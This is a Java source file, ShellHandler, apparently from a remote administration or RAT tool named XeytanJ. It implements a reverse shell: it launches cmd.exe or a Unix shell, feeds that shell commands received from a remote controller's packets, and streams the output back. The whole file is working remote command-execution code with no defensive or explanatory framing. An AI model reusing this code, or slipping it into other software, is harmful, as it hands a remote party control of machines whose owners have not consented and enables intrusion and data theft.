package com.melardev.xeytanj.services;

import com.melardev.xeytanj.IApplication;
import com.melardev.xeytanj.enums.SessionType;
import com.melardev.xeytanj.logger.ConsoleLogger;
import com.melardev.xeytanj.logger.ILogger;
import com.melardev.xeytanj.net.packets.PacketShell;
import com.melardev.xeytanj.remote.PacketHandler;

import java.io.*;


public class ShellHandler implements Runnable, PacketHandler<PacketShell> {

    private final IApplication app;

    private BufferedReader isProc;
    private BufferedWriter osProc;

    private Process proc;
    private ILogger logger;

    public ShellHandler(IApplication application, ConsoleLogger logger) {
        this.app = application;
        this.logger = logger;
    }

    @Override
    public void handlePacket(PacketShell packet) {
        logger.trace("Handling " + packet.getPacketShellInstruction());
        if (packet.getPacketShellInstruction() == PacketShell.PacketShellInstruction.STOP) {
            try {
                proc.destroy();
                this.osProc.close();
                this.isProc.close();
            } catch (IOException e) {
                e.printStackTrace();
            }

            app.onSessionClosed(SessionType.REVERSE_SHELL);

        } else if (packet.getPacketShellInstruction() == PacketShell.PacketShellInstruction.EXEC) {
            try {
                osProc.write(packet.getResult() + "\n");
                osProc.flush();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void run() {
        logger.traceCurrentMethodName();
        try {
            String shellPath = getShellPath();
            if (shellPath == null) return;

            ProcessBuilder pb = new ProcessBuilder();
            // merge STDERR with STDOUT
            pb.redirectErrorStream(true);
            pb.redirectInput(ProcessBuilder.Redirect.PIPE);
            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);

            proc = pb.command(shellPath).start();
            isProc = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            osProc = new BufferedWriter(new OutputStreamWriter(proc.getOutputStream()));

            char[] buffer = new char[4096];
            // readLine will not work for the last line for exampel c:\melardev> because there it does not end with \n
            int bytesRead;
            while ((bytesRead = isProc.read(buffer)) != -1) {
                String out = new String(buffer, 0, bytesRead);
                app.sendPacket(new PacketShell(PacketShell.PacketShellInstruction.OUT, out));
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void setLogger(ILogger logger) {
        this.logger = logger;
    }

    public void init() {
        logger.traceCurrentMethodName();

        new Thread(this, "Shell handler Thread").start();
    }

    private static String getShellPath() {
        String os = System.getProperty("os.name").toLowerCase();
        if (os.startsWith("windows"))
            return "cmd.exe";
        else {
            String[] shellLocations = {
                    "/bin/bash", "/bin/sh", "/bin/csh", "/bin/ksh"
            };
            for (String shellLocation : shellLocations) {
                File shell = new File(shellLocation);
                if (shell.exists())
                    return shell.getAbsolutePath();
            }
        }
        return null;
    }


}
